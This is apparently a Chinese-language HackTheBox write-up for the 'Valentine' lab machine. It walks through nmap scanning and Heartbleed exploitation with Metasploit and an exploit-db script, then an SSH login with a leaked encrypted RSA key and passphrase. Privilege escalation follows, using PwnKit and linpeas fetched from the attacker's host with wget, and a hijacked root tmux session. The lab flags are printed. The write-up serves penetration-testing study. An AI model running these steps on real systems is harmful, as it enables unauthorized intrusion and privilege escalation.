# HTB靶机 012 Valentine WriteUp


&lt;!--more--&gt;

# 012-Valentine

![image-20230429004811139](resource/012-Valentine.assets/image-20230429004811139.png)

靶机IP：10.10.10.79



## Scan

nmap端口扫描：

```shell
┌──(xavier㉿kali)-[~]
└─$ sudo nmap -sSV -T4 10.10.10.79 -F
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 00:47 CST
Nmap scan report for 10.10.10.79
Host is up (0.30s latency).
Not shown: 97 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.88 seconds
```



访问80、443端口都是如下一张图片：

![image-20230429004953743](resource/012-Valentine.assets/image-20230429004953743.png)



通过图片联想到心脏滴血漏洞，使用nmap进行探测

```shell
┌──(xavier㉿kali)-[~]
└─$ ls /usr/share/nmap/scripts | grep ssl             
rmi-vuln-classloader.nse
ssl-ccs-injection.nse
ssl-cert-intaddr.nse
ssl-cert.nse
ssl-date.nse
ssl-dh-params.nse
ssl-enum-ciphers.nse
ssl-heartbleed.nse
ssl-known-key.nse
ssl-poodle.nse
sslv2-drown.nse
sslv2.nse

┌──(xavier㉿kali)-[~]
└─$ sudo nmap -sSV -T4 10.10.10.79 -p22,443 --script ssl-heartbleed.nse
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 00:54 CST
Nmap scan report for 10.10.10.79
Host is up (0.32s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.19 seconds
```

探测结果说明心脏滴血漏洞存在。

之后先针对心脏滴血漏洞进行利用，同时扫描全端口，看看有没有忽略的信息

```shell
┌──(xavier㉿kali)-[~]
└─$ sudo nmap -sSV -T4 10.10.10.79 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 15:24 CST
Nmap scan report for 10.10.10.79
Host is up (0.25s latency).
Not shown: 65525 closed tcp ports (reset)
PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http         Apache httpd 2.2.22 ((Ubuntu))
443/tcp   open     ssl/http     Apache httpd 2.2.22 ((Ubuntu))
1983/tcp  filtered lhtp
2028/tcp  filtered submitserver
19156/tcp filtered unknown
20316/tcp filtered unknown
28245/tcp filtered unknown
50399/tcp filtered unknown
55915/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1181.61 seconds
```

使用-sC 对相应端口进行扫描，发现无新增结果，就不写细节了。

## Heartbleed



### MSF

利用MSF进行漏洞利用

```shell
┌──(xavier㉿kali)-[~]
└─$ msfconsole                                                                              
msf6 &gt; search heartbleed

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
   1  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssl/openssl_heartbleed

msf6 &gt; use auxiliary/scanner/ssl/openssl_heartbleed 
msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; set RHOSTS 10.10.10.79
RHOSTS =&gt; 10.10.10.79
msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; run

[&#43;] 10.10.10.79:443       - Heartbeat response with leak, 65535 bytes
[*] 10.10.10.79:443       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; set VERBOSE True
VERBOSE =&gt; true
msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; exploit

[*] 10.10.10.79:443       - Leaking heartbeat response #1
[*] 10.10.10.79:443       - Sending Client Hello...
[*] 10.10.10.79:443       - SSL record #1:

```

![image-20230429155205097](resource/012-Valentine.assets/image-20230429155205097.png)

![image-20230429155239318](resource/012-Valentine.assets/image-20230429155239318.png)

![image-20230429155329208](resource/012-Valentine.assets/image-20230429155329208.png)

心脏滴血是一个信息泄露漏洞，每次泄露的信息并不一样，所以需要多执行几次。



### 非MSF

搜索EXP：

```shell
┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
└─$ searchsploit heartbleed                                            
--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - &#39;Heartbleed&#39; Memory Disclosure (Multiple SSL/TLS Versions)      | multiple/remote/32764.py
OpenSSL TLS Heartbeat Extension - &#39;Heartbleed&#39; Information Leak (1)                                      | multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - &#39;Heartbleed&#39; Information Leak (2) (DTLS Support)                       | multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - &#39;Heartbleed&#39; Memory Disclosure                                         | multiple/remote/32745.py
--------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

找个利用脚本进行利用

```shell
┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
└─$ searchsploit -m multiple/remote/32764.py
  Exploit: OpenSSL 1.0.1f TLS Heartbeat Extension - &#39;Heartbleed&#39; Memory Disclosure (Multiple SSL/TLS Versions)
      URL: https://www.exploit-db.com/exploits/32764
     Path: /usr/share/exploitdb/exploits/multiple/remote/32764.py
    Codes: CVE-2014-0346, CVE-2014-0160, OSVDB-105465
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/xavier/Desktop/HTB/012-Valentine/32764.py

┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
└─$ python2 32764.py -h
Usage: 32764.py server [options]

Test for SSL heartbeat vulnerability (CVE-2014-0160)

Options:
  -h, --help            show this help message and exit
  -p PORT, --port=PORT  TCP port to test (default: 443)
```

漏洞利用：

```shell
┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
└─$ python2 32764.py 10.10.10.79
Trying SSL 3.0...
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0300, length = 94
 ... received message: type = 22, ver = 0300, length = 885
 ... received message: type = 22, ver = 0300, length = 331
 ... received message: type = 22, ver = 0300, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0300, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .&#43;..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....&#34;.
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
```

同样，因为信息泄露的不确定性，我们需要多执行几次，以发现所期望的敏感信息。

![image-20230429160817669](resource/012-Valentine.assets/image-20230429160817669.png)

执行了多次后，发现泄露了如下信息：

```shell
0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.
```

对`$text`的值`aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`进行base64解密

```shell
┌──(xavier㉿kali)-[~]
└─$ echo &#34;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&#34; | base64 -d
heartbleedbelievethehype
```



## Web扫描

这边decode.php也提示我忘了一个环节：对Web路径的探测，这里补一下

```shell
┌──(xavier㉿kali)-[~]
└─$ dirsearch -e php,html,txt -t 100 -u https://10.10.10.79/ 
Target: https://10.10.10.79/

[16:14:19] Starting: 
[16:15:27] 301 -  310B  - /dev  -&gt;  https://10.10.10.79/dev/  
[16:15:27] 200 -    1KB - /dev/
[16:15:39] 200 -   38B  - /index.php  
```

访问dev目录如下：

![image-20230429161913176](resource/012-Valentine.assets/image-20230429161913176.png)

查看notes.txt

```
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don&#39;t use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

查看hype_key：

![image-20230429163925200](resource/012-Valentine.assets/image-20230429163925200.png)

下载hype_key

```shell
$ wget https://10.10.10.79/dev/hype_key --no-check-certificate
```

然后通过xxd 对十六进制进行转换：

```shell
┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
└─$ xxd -r -p hype_key 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46&#43;9nEpCMfTPhNuJRcW2U2gJcOFH&#43;9RJDBC5UJMUS1/gjB/7/My00Mwx&#43;aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ&#43;Ea1T8zlas6fcmhM8A&#43;8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x&#43;LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq&#43;E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z&#43;uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8&#43;F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
&#43;wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX&#43;bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9&#43;Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL&#43;1Tg9IpNyISFCFYjSqiyG&#43;WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp&#43;JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp&#43;VuPqaqDvMCVe1DZCb4MjAj
Mslf&#43;9xK&#43;TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe&#43;b853zuV2qL
suLaBMxYKm3&#43;zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ&#43;95CGHJE8MkhD3
-----END RSA PRIVATE KEY----- 
```

可以看到是一个RSA私钥，接下去用ssh进行连接

## 初始shell

对hype_key进行转码，并通过ssh进行连接

```shell
┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
└─$ xxd -r -p hype_key &gt; hype_key.rsa

┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
└─$ chmod 600 hype_key.rsa

┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
└─$ ssh -i hype_key.rsa hype@10.10.10.79
Enter passphrase for key &#39;hype_key.rsa&#39;: 
```

这里私钥有密码，想到了之前decode中获取的字符串：heartbleedbelievethehype

```shell
┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
└─$ ssh -i hype_key.rsa hype@10.10.10.79
Enter passphrase for key &#39;hype_key.rsa&#39;: 
sign_and_send_pubkey: no mutual signature supported
hype@10.10.10.79&#39;s password: 
```

这里有个报错，因为新版本的ssh不再支持一些弱加密算法，所以如果要用的话需要手动指定`-o PubkeyAcceptedKeyTypes=&#43;ssh-rsa`。

```shell
┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
└─$ ssh -i hype_key.rsa hype@10.10.10.79 -o PubkeyAcceptedKeyTypes=&#43;ssh-rsa
Enter passphrase for key &#39;hype_key.rsa&#39;: 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release &#39;14.04.5 LTS&#39; available.
Run &#39;do-release-upgrade&#39; to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
hype@Valentine:~$ 
```

这里也可以修改SSH配置文件，在文件末尾追加以下内容

```shell
Host *
    PubkeyAcceptedKeyTypes=&#43;ssh-rsa
    HostKeyAlgorithms=&#43;ssh-rsa
```

![image-20230429170722849](resource/012-Valentine.assets/image-20230429170722849.png)



## root shell

上传linpeas.sh进行信息搜集，利用Python和wget进行上传

```shell
# kali
┌──(xavier㉿kali)-[~/Desktop/HTB/tools]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.79 - - [29/Apr/2023 17:10:53] &#34;GET /linpeas.sh HTTP/1.1&#34; 200 -

# Victim
hype@Valentine:/tmp$ wget http://10.10.14.22/linpeas.sh
hype@Valentine:/tmp$ chmod &#43;x linpeas.sh
hype@Valentine:/tmp$ ./linpeas.sh &gt; result.txt
```

利用同样的方式，再把result.txt下载到本地

### CVE-2021-4034

查看result.txt，发现系统存在sudo CVE-2021-4034漏洞，可利用该漏洞提权。

![image-20230429172250485](resource/012-Valentine.assets/image-20230429172250485.png)

```shell
hype@Valentine:/tmp$ wget http://10.10.14.22/PwnKit
hype@Valentine:/tmp$ chmod &#43;x PwnKit 
hype@Valentine:/tmp$ ./PwnKit 
root@Valentine:/tmp# id  
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),124(sambashare),1000(hype)
root@Valentine:/tmp# 
```

![image-20230429172533596](resource/012-Valentine.assets/image-20230429172533596.png)

```shell
root@Valentine:/tmp# cat /root/root.txt 
adf6f323296f600cec9294d64c6c9bc1
root@Valentine:/tmp# cat /home/hype/user.txt 
0b946d1f7c12bb371585d67c10557dc8
```

### tmux提权

查看result.txt，发现tmux session

![image-20230429174112440](resource/012-Valentine.assets/image-20230429174112440.png)

通过tmux进行提权，成功获取root权限：

```shell
hype@Valentine:/tmp$ tmux -S /.devs/dev_sess

root@Valentine:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@Valentine:/tmp# 
```

![image-20230429174244442](resource/012-Valentine.assets/image-20230429174244442.png)







## END



---

> 作者: Xavier  
> URL: http://localhost:1313/posts/hackthebox-valentine/  

